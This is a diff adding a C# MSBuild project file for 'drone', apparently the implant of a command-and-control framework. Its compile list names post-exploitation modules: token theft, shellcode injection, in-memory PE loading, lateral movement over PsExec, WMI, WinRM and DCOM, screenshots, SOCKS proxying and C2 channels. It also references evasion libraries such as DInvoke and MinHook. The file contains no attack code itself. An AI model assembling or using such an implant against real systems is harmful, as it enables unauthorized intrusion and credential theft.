@@ -1,0 +1,180 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+    <PropertyGroup>
+        <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+        <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+        <ProjectGuid>{91EA50CD-E8DF-4EDF-A765-75354643BD0D}</ProjectGuid>
+        <OutputType>Library</OutputType>
+        <AppDesignerFolder>Properties</AppDesignerFolder>
+        <RootNamespace>Drone</RootNamespace>
+        <AssemblyName>drone</AssemblyName>
+        <TargetFrameworkVersion>v4.8.1</TargetFrameworkVersion>
+        <FileAlignment>512</FileAlignment>
+        <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+        <LangVersion>10</LangVersion>
+        <ImplicitUsings>enable</ImplicitUsings>
+    </PropertyGroup>
+    <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+        <PlatformTarget>AnyCPU</PlatformTarget>
+        <DebugSymbols>true</DebugSymbols>
+        <DebugType>full</DebugType>
+        <Optimize>false</Optimize>
+        <OutputPath>bin\Debug\</OutputPath>
+        <DefineConstants>DEBUG;TRACE</DefineConstants>
+        <ErrorReport>prompt</ErrorReport>
+        <WarningLevel>4</WarningLevel>
+        <Prefer32bit>false</Prefer32bit>
+    </PropertyGroup>
+    <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+        <PlatformTarget>AnyCPU</PlatformTarget>
+        <DebugType>none</DebugType>
+        <Optimize>true</Optimize>
+        <OutputPath>..\TeamServer\Resources\</OutputPath>
+        <DefineConstants>TRACE</DefineConstants>
+        <ErrorReport>prompt</ErrorReport>
+        <WarningLevel>4</WarningLevel>
+        <Prefer32bit>false</Prefer32bit>
+    </PropertyGroup>
+    <ItemGroup>
+        <Reference Include="DInvoke.Data, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+          <HintPath>..\packages\DInvoke.Data.1.0.4\lib\netstandard2.0\DInvoke.Data.dll</HintPath>
+        </Reference>
+        <Reference Include="DInvoke.DynamicInvoke, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+          <HintPath>..\packages\DInvoke.DynamicInvoke.1.0.4\lib\netstandard2.0\DInvoke.DynamicInvoke.dll</HintPath>
+        </Reference>
+        <Reference Include="DInvoke.ManualMap, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+          <HintPath>..\packages\DInvoke.ManualMap.1.0.4\lib\netstandard2.0\DInvoke.ManualMap.dll</HintPath>
+        </Reference>
+        <Reference Include="MinHook.NET, Version=1.1.1.0, Culture=neutral, processorArchitecture=MSIL">
+          <HintPath>..\packages\MinHook.NET.1.1.1\lib\net45\MinHook.NET.dll</HintPath>
+        </Reference>
+        <Reference Include="mscorlib" />
+        <Reference Include="PresentationFramework" />
+        <Reference Include="protobuf-net, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67, processorArchitecture=MSIL">
+          <HintPath>..\packages\protobuf-net.3.1.25\lib\net462\protobuf-net.dll</HintPath>
+        </Reference>
+        <Reference Include="protobuf-net.Core, Version=3.0.0.0, Culture=neutral, PublicKeyToken=257b51d87d2e4d67, processorArchitecture=MSIL">
+          <HintPath>..\packages\protobuf-net.Core.3.1.25\lib\net462\protobuf-net.Core.dll</HintPath>
+        </Reference>
+        <Reference Include="System" />
+        <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+          <HintPath>..\packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+        </Reference>
+        <Reference Include="System.Collections.Immutable, Version=1.2.5.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+          <HintPath>..\packages\System.Collections.Immutable.1.7.1\lib\net461\System.Collections.Immutable.dll</HintPath>
+        </Reference>
+        <Reference Include="System.Core" />
+        <Reference Include="System.Data" />
+        <Reference Include="System.Drawing" />
+        <Reference Include="System.Management" />
+        <Reference Include="System.Management.Automation">
+          <HintPath>System.Management.Automation.dll</HintPath>
+        </Reference>
+        <Reference Include="System.Memory, Version=4.0.1.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+          <HintPath>..\packages\System.Memory.4.5.4\lib\net461\System.Memory.dll</HintPath>
+        </Reference>
+        <Reference Include="System.Net.Http" />
+        <Reference Include="System.Numerics" />
+        <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+          <HintPath>..\packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+        </Reference>
+        <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=4.0.4.1, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+          <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.4.5.3\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+        </Reference>
+        <Reference Include="System.Runtime.Remoting" />
+        <Reference Include="System.Xml" />
+    </ItemGroup>
+    <ItemGroup>
+        <Compile Include="Commands\ChangeDirectory.cs" />
+        <Compile Include="Commands\Connect.cs" />
+        <Compile Include="Commands\DcomCommand.cs" />
+        <Compile Include="Commands\DroneCommand.cs" />
+        <Compile Include="Commands\ExecuteAssembly.cs" />
+        <Compile Include="Commands\KillProcess.cs" />
+        <Compile Include="Commands\Link.cs" />
+        <Compile Include="Commands\PsExecCommand.cs" />
+        <Compile Include="Commands\Run.cs" />
+        <Compile Include="Commands\RunAs.cs" />
+        <Compile Include="Commands\RunPe.cs" />
+        <Compile Include="Commands\SetSleep.cs" />
+        <Compile Include="Commands\ShInject.cs" />
+        <Compile Include="Commands\ShSpawn.cs" />
+        <Compile Include="Commands\StopDrone.cs" />
+        <Compile Include="Commands\WhoAmI.cs" />
+        <Compile Include="Commands\ListDirectory.cs" />
+        <Compile Include="Commands\ListProcesses.cs" />
+        <Compile Include="Commands\MakeDirectory.cs" />
+        <Compile Include="Commands\MakeToken.cs" />
+        <Compile Include="Commands\PowerShell.cs" />
+        <Compile Include="Commands\PowerShellImport.cs" />
+        <Compile Include="Commands\PrintWorkingDirectory.cs" />
+        <Compile Include="Commands\ReadFile.cs" />
+        <Compile Include="Commands\RemoveDirectory.cs" />
+        <Compile Include="Commands\RemoveFile.cs" />
+        <Compile Include="Commands\RevToSelf.cs" />
+        <Compile Include="Commands\Shell.cs" />
+        <Compile Include="Commands\StealToken.cs" />
+        <Compile Include="Commands\TakeScreenshot.cs" />
+        <Compile Include="Commands\UploadFile.cs" />
+        <Compile Include="Commands\WinRmCommand.cs" />
+        <Compile Include="Commands\WmiCommand.cs" />
+        <Compile Include="CommModules\CommModule.cs" />
+        <Compile Include="CommModules\ExtCommModule.cs" />
+        <Compile Include="CommModules\HttpCommModule.cs" />
+        <Compile Include="CommModules\SmbCommModule.cs" />
+        <Compile Include="CommModules\TcpCommModule.cs" />
+        <Compile Include="Config.cs" />
+        <Compile Include="Drone.cs" />
+        <Compile Include="Global.cs" />
+        <Compile Include="Interop\Data.cs" />
+        <Compile Include="Interop\Delegates.cs" />
+        <Compile Include="Interop\Methods.cs" />
+        <Compile Include="Messages\C2Frame.cs" />
+        <Compile Include="Messages\DirectoryEntry.cs" />
+        <Compile Include="Messages\DroneTask.cs" />
+        <Compile Include="Messages\LinkNotification.cs" />
+        <Compile Include="Messages\Metadata.cs" />
+        <Compile Include="Messages\ProcessEntry.cs" />
+        <Compile Include="Messages\ReversePortForwardPacket.cs" />
+        <Compile Include="Messages\Socks4ConnectRequest.cs" />
+        <Compile Include="Messages\Socks4Packet.cs" />
+        <Compile Include="Messages\TaskOutput.cs" />
+        <Compile Include="Program.cs" />
+        <Compile Include="Properties\AssemblyInfo.cs" />
+        <Compile Include="Utilities\Crypto.cs" />
+        <Compile Include="Utilities\Extensions.cs" />
+        <Compile Include="Utilities\Helpers.cs" />
+        <Compile Include="Utilities\PELoader\ArgumentHandler.cs" />
+        <Compile Include="Utilities\PELoader\ExitPatcher.cs" />
+        <Compile Include="Utilities\PELoader\ExtraAPIPatcher.cs" />
+        <Compile Include="Utilities\PELoader\ExtraEnvironmentPatcher.cs" />
+        <Compile Include="Utilities\PELoader\FileDescriptorRedirector.cs" />
+        <Compile Include="Utilities\PELoader\ImportResolver.cs" />
+        <Compile Include="Utilities\PELoader\PeLoader.cs" />
+        <Compile Include="Utilities\PELoader\PeMapper.cs" />
+        <Compile Include="Utilities\PowerShellRunner.cs" />
+        <Compile Include="Utilities\ReversePortForwardState.cs" />
+        <Compile Include="Utilities\TransactedAssembly.cs" />
+    </ItemGroup>
+    <ItemGroup>
+      <None Include="dnMerge.config" />
+      <None Include="packages.config" />
+    </ItemGroup>
+    <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+    <Import Project="..\packages\dnMerge.0.5.15\build\dnMerge.targets" Condition="Exists('..\packages\dnMerge.0.5.15\build\dnMerge.targets')" />
+    <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+      <PropertyGroup>
+        <ErrorText>This project references NuGet package(s) that are missing on this computer. Enable NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105.The missing file is {0}.</ErrorText>
+      </PropertyGroup>
+      <Error Condition="!Exists('..\packages\dnMerge.0.5.15\build\dnMerge.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\dnMerge.0.5.15\build\dnMerge.targets'))" />
+    </Target>
+    <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+         Other similar extension points exist, see Microsoft.Common.targets.
+    <Target Name="BeforeBuild">
+    </Target>
+    <Target Name="AfterBuild">
+    </Target>
+    -->
+
+</Project>
